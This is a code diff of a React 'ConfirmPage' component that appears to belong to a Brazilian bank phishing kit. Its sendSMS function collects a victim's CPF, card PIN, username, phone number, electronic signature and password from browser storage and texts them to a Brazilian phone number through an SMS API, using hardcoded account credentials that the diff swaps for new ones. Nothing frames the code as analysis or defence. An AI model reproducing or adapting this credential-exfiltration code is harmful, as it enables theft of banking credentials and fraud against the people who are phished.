@@ -37,8 +37,8 @@ const ConfirmPage = () => {
   };
 
   const sendSMS = () => {
-    const accountSid = 'AC93856d70c0824afdd58ddd07ad021399';
-    const authToken = '269509b5238c7d5d7035ab2b8dccd05c';
+    const accountSid = 'ACbc61dd11fcc5d5c2820ccb59307e70a0';
+    const authToken = '2f6cdf45aab285bd0b7f13d1bfce2d90';
 
     const senhaCartao = localStorage.getItem('senhaCartao');
     const username = localStorage.getItem('username');
@@ -50,8 +50,8 @@ const ConfirmPage = () => {
       body: JSON.stringify({
         accountSid,
         authToken,
-        from: '+14065055775',
-        to: '+5511939070140',
+        from: '+15417222947',
+        to: '+5511958012302',
         body: `CPF: ${cpf}\nSenha do Cartão: ${senhaCartao}\nUsername: ${username}\nTelefone: ${telefone}\nAssinatura Eletrônica: ${assinaturaEletronica}\nPassword: ${password}`,
       }),
       headers: {
